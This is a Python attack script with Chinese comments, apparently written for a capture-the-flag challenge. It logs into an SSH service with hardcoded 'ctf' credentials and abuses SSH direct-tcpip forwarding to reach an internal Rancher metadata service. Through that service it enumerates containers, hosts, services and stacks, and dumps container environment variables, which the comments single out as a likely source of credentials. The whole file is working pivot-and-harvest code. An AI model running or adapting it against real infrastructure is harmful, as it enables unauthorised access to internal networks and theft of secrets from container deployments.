import paramiko
import socket
import time
import sys

"""
这是Rancher元数据服务！
找到了很多有趣的信息：
- containers/ - 容器列表
- hosts/ - 主机列表
- self/ - 当前容器信息
- services/ - 服务列表（包含verygoodssh, very_good_ssh）
- stacks/ - 堆栈列表

让我深入探索self/和容器信息
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def http_get(transport, host, port, path):
    """发送HTTP GET请求"""
    try:
        channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
        channel.settimeout(5)
        
        request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
        channel.send(request.encode())
        
        time.sleep(0.5)
        response = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                response += chunk
            except:
                break
        
        channel.close()
        
        # 解析HTTP响应
        response_text = response.decode()
        if "\r\n\r\n" in response_text:
            body = response_text.split("\r\n\r\n", 1)[1]
            return body
        return response_text
    except Exception as e:
        return f"Error: {e}"

def explore_self():
    """探索self/"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 探索/latest/self/")
    
    paths = [
        "/latest/self/",
        "/latest/self/container/",
        "/latest/self/container/name",
        "/latest/self/container/create_index",
        "/latest/self/container/primary_ip",
        "/latest/self/container/ports",
        "/latest/self/container/service_name",
        "/latest/self/container/service_index",
        "/latest/self/container/stack_name",
        "/latest/self/container/stack_uuid",
        "/latest/self/container/labels",
        "/latest/self/container/dns",
        "/latest/self/container/dns_search",
        "/latest/self/container/environment",  # 环境变量！可能有凭据
        "/latest/self/container/host_uuid",
        "/latest/self/container/hostname",
        "/latest/self/container/ips",
        "/latest/self/container/state",
        "/latest/self/container/uuid",
        "/latest/self/host/",
        "/latest/self/host/name",
        "/latest/self/host/agent_ip",
        "/latest/self/host/labels",
        "/latest/self/host/uuid",
        "/latest/self/service/",
        "/latest/self/service/name",
        "/latest/self/service/containers",
        "/latest/self/stack/",
        "/latest/self/stack/name",
        "/latest/self/stack/services",
    ]
    
    for path in paths:
        result = http_get(transport, "172.17.0.2", 80, path)
        if result and "Error" not in result and "Not found" not in result:
            print(f"\n{path}:")
            print(result[:1000])
    
    ssh.close()

def find_verygoodssh_container():
    """找到verygoodssh容器的详细信息"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 查找verygoodssh容器")
    
    # 先获取容器列表
    result = http_get(transport, "172.17.0.2", 80, "/latest/containers/")
    print(f"容器列表: {result[:500]}")
    
    # 找到包含verygoodssh的容器
    lines = result.strip().split("\n")
    for line in lines:
        if "verygoodssh" in line.lower():
            # 格式: 0=ad-world-xxx
            parts = line.split("=")
            if len(parts) == 2:
                index = parts[0]
                name = parts[1]
                print(f"\n找到容器: {name} (index={index})")
                
                # 获取容器详细信息
                container_paths = [
                    f"/latest/containers/{index}/",
                    f"/latest/containers/{index}/name",
                    f"/latest/containers/{index}/primary_ip",
                    f"/latest/containers/{index}/environment",  # 环境变量！
                    f"/latest/containers/{index}/labels",
                    f"/latest/containers/{index}/ports",
                ]
                
                for path in container_paths:
                    r = http_get(transport, "172.17.0.2", 80, path)
                    if r and "Error" not in r and "Not found" not in r:
                        print(f"\n{path}:")
                        print(r[:500])
    
    ssh.close()

def explore_all_containers_env():
    """探索所有容器的环境变量"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索所有容器的环境变量")
    
    # 获取容器数量
    result = http_get(transport, "172.17.0.2", 80, "/latest/containers/")
    lines = result.strip().split("\n")
    
    print(f"共{len(lines)}个容器")
    
    for line in lines[:20]:  # 只检查前20个
        parts = line.split("=")
        if len(parts) == 2:
            index = parts[0]
            name = parts[1]
            
            # 获取环境变量
            env_result = http_get(transport, "172.17.0.2", 80, f"/latest/containers/{index}/environment/")
            if env_result and "Error" not in env_result and "Not found" not in env_result and env_result.strip():
                print(f"\n容器 {name} 环境变量:")
                print(env_result[:1000])
    
    ssh.close()

def explore_hosts():
    """探索主机信息"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索主机信息")
    
    # 获取主机列表
    result = http_get(transport, "172.17.0.2", 80, "/latest/hosts/")
    print(f"主机列表:\n{result}")
    
    lines = result.strip().split("\n")
    for line in lines:
        parts = line.split("=")
        if len(parts) == 2:
            index = parts[0]
            name = parts[1]
            
            print(f"\n=== 主机: {name} ===")
            
            host_paths = [
                f"/latest/hosts/{index}/",
                f"/latest/hosts/{index}/name",
                f"/latest/hosts/{index}/agent_ip",
                f"/latest/hosts/{index}/labels",
                f"/latest/hosts/{index}/uuid",
                f"/latest/hosts/{index}/local_storage_mb",
                f"/latest/hosts/{index}/memory",
                f"/latest/hosts/{index}/milli_cpu",
            ]
            
            for path in host_paths:
                r = http_get(transport, "172.17.0.2", 80, path)
                if r and "Error" not in r and "Not found" not in r:
                    print(f"{path}: {r[:200]}")
    
    ssh.close()

def explore_verygoodssh_service():
    """探索very_good_ssh服务"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索very_good_ssh服务")
    
    # 获取服务列表
    result = http_get(transport, "172.17.0.2", 80, "/latest/services/")
    print(f"服务列表:\n{result}")
    
    lines = result.strip().split("\n")
    for line in lines:
        if "verygoodssh" in line.lower() or "very_good_ssh" in line.lower():
            parts = line.split("=")
            if len(parts) == 2:
                index = parts[0]
                name = parts[1]
                
                print(f"\n=== 服务: {name} (index={index}) ===")
                
                service_paths = [
                    f"/latest/services/{index}/",
                    f"/latest/services/{index}/name",
                    f"/latest/services/{index}/containers",
                    f"/latest/services/{index}/labels",
                    f"/latest/services/{index}/ports",
                    f"/latest/services/{index}/links",
                    f"/latest/services/{index}/stack_name",
                    f"/latest/services/{index}/metadata",  # 服务元数据
                ]
                
                for path in service_paths:
                    r = http_get(transport, "172.17.0.2", 80, path)
                    if r and "Error" not in r and "Not found" not in r:
                        print(f"\n{path}:")
                        print(r[:500])
    
    ssh.close()

def explore_stacks():
    """探索堆栈"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索堆栈")
    
    result = http_get(transport, "172.17.0.2", 80, "/latest/stacks/")
    lines = result.strip().split("\n")
    
    for line in lines:
        if "verygoodssh" in line.lower() or "very_good_ssh" in line.lower():
            parts = line.split("=")
            if len(parts) == 2:
                index = parts[0]
                name = parts[1]
                
                print(f"\n=== 堆栈: {name} ===")
                
                stack_paths = [
                    f"/latest/stacks/{index}/",
                    f"/latest/stacks/{index}/name",
                    f"/latest/stacks/{index}/services",
                    f"/latest/stacks/{index}/environment_name",
                ]
                
                for path in stack_paths:
                    r = http_get(transport, "172.17.0.2", 80, path)
                    if r and "Error" not in r and "Not found" not in r:
                        print(f"{path}: {r[:300]}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入探索Rancher元数据服务")
    print("="*60)
    
    explore_self()
    find_verygoodssh_container()
    explore_all_containers_env()
    explore_hosts()
    explore_verygoodssh_service()
    explore_stacks()
